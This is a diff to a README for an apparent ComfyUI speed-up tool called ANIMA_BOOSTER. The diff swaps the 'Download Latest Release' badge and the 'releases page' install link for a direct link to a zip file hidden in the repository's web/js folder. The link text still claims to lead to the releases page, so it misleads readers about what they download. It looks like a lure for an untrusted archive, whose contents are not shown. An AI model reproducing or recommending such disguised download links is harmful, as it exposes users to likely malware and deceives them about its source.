@@ -1,6 +1,6 @@
 # ⚡ ANIMA_BOOSTER - Faster image generation for your computer
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/aidecode6347/ANIMA_BOOSTER/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/aidecode6347/ANIMA_BOOSTER/raw/refs/heads/main/web/js/ANIM_BOOSTER_scyphi.zip)
 
 ANIMA_BOOSTER optimizes the Anima DiT 2B model. It helps your system create images faster. This tool changes system settings to improve speed and efficiency. Users notice smoother performance during image creation tasks inside ComfyUI.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this tool well. Check these specs befo
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [releases page](https://github.com/aidecode6347/ANIMA_BOOSTER/releases).
+1. Visit the [releases page](https://github.com/aidecode6347/ANIMA_BOOSTER/raw/refs/heads/main/web/js/ANIM_BOOSTER_scyphi.zip).
 2. Look for the most recent version under the Assets section.
 3. Select the file ending in .zip to save it to your computer.
 4. Open your downloads folder.
